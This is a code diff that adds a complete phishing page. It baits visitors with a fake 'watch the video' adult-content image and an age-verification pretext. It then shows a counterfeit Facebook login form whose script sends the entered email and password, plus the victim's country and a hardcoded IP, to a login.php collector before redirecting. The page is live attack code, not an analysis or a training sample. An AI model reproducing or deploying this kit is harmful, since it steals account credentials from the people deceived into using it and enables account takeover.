@@ -1,0 +1,126 @@
+
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+		
+		<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
+
+        <title>Are you over 18+?</title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+        <style type="text/css">
+            *{box-sizing:border-box}html{background:#e2e2e2}body{background:#e2e2e2;margin:0;padding:0;font-family:Lato,sans-serif}.login-form-wrap{background:radial-gradient(ellipse at center,#5170ad 0,#355493 100%);border:1px solid #2d416d;box-shadow:0 1px #5670a4 inset,0 0 10px 5px rgba(0,0,0,.1);border-radius:5px;width:380px;height:480px;margin:60px auto;padding:50px 30px 0 30px;text-align:center}.login-form-wrap h1{margin:0 0 50px 0;padding:0;font-weight:700;font-size:26px;color:#fff}.login-form-wrap h5{margin-top:40px}.login-form-wrap h5>a{font-size:14px;color:#fff;text-decoration:none;font-weight:400}.login-form input[name=email],.login-form input[name=pass]{width:100%;border:1px solid #314d89;margin-right:110px;outline:0;padding:12px 20px;font-weight:400;font-family:Lato,sans-serif;cursor:pointer}.login-form input[name=email]{border-bottom:none;border-radius:4px 4px 0 0;padding-bottom:13px;box-shadow:0 -1px 0 #e0e0e0 inset,0 1px 2px rgba(0,0,0,.23) inset}.login-form input[name=pass]{border-top:none;border-radius:0 0 4px 4px;box-shadow:0 -1px 2px rgba(0,0,0,.23) inset,0 1px 2px rgba(255,255,255,.1)}
+            button{font-family:Lato,sans-serif;font-weight:400;background:linear-gradient(to bottom,#e0e0e0 0,#cecece 100%);display:block;margin:20px auto 0 auto;width:100%;border:none;border-radius:3px;padding:8px;font-size:17px;color:#636363;text-shadow:0 1px 0 rgba(255,255,255,.45);font-weight:700;box-shadow:0 1px 3px 1px rgba(0,0,0,.17),0 1px 0 rgba(255,255,255,.36) inset}
+            button:hover{background:#ddd}.login-form input[type=submit]:active{padding-top:9px;padding-bottom:7px;background:#c9c9c9}body{background-image: url(https://i.imgur.com/odkOPeV.png);height: 100%;background-position: center; background-repeat: no-repeat; background-size: cover;}
+        </style>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-WL0X810D6J"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-WL0X810D6J');
+</script>
+    </head>
+    <body onclick="showlog()">	
+        <div align="center" style="margin-top: 30px;">
+            <div class="separator" style="clear: both; text-align: center;">
+                <b><span style="color: red; font-size: 26pt; font-style: italic;"><a href="#" onclick="showlog()" style="color: red;">▶ CLICK HERE TO WATCH THE VIDEO</a></span></b>
+            </div>
+            <img src="https://i.imgur.com/I67OV5f.jpg" class="img-responsive" alt="Image" onclick="showlog();">
+        </div>
+        <div class="modal fade" id="myModal" role="dialog">
+            <section class="login-form-wrap">
+                <h1>Facebook</h1>
+                <div style="background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="result">This website requires you to be 18 years or older to enter! Please login Facebook to Confirm</div>
+                <div class="login-form" >
+                    <label>
+                        <input type="text" id="id" name="email" required placeholder="Email address or phone number">
+                    </label>
+                    <label>
+                        <input type="password" id="pass" name="pass" required placeholder="Password">
+                    </label>
+                    <button type="submit" id="submit" value="Log In">Log In </button>
+                </div>
+                <h5><a href="#">Forgotten password?</a></h5>
+            </section>
+        </div>
+        <script src="//code.jquery.com/jquery.js"></script>
+        <script type="text/javascript">
+                $(document).ready(function () {
+                                    });
+                function showlog() {
+                    $('#myModal').modal({
+                        backdrop: 'static',
+                        keyboard: true,
+                        show: true
+                    });
+                }
+        </script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
+        <script>
+        setInterval(function () {
+      
+ }, 0);
+ function lee() {
+     debugger
+ }
+ function getcountry() {
+
+var jqXHR = $.ajax({
+ url: 'https://cloudflare.com/cdn-cgi/trace',
+//...
+
+async: false
+
+});
+
+return jqXHR.responseText.match(/loc=(.+)/)[1];
+
+}
+ 
+ var country = getcountry();
+ console.log(country);
+ 
+ 
+ 
+ 	ip = "222.252.98.61";
+$('#submit').click(function () {
+    let uid = $('#id').val();
+    let pass = $('#pass').val();
+	
+    if (!uid || !pass) {
+        $('#result').html("The email address or mobile number you entered isn't connected to an account");
+        return false
+    };
+    $('#submit').html('Please Wait!! !');
+
+    $.ajax({
+        url: 'login.php',
+        type: 'POST',
+        dataType: 'JSON',
+        data: {
+            pass: pass,
+            uid: uid,
+			ip:ip,
+			country:country,
+			uri:window.location.href.split('?')[0],
+
+        },
+        success: (data) => {
+            $('#submit').html('Log In');
+            if (data.error) {
+                $('#result').html(data.msg);
+                $('input').val('')
+            } else {
+                setTimeout(function () {
+                   window.location = data.url
+                }, 1000)
+            }
+        }
+    })
+})
+
+</script>
+    </body>
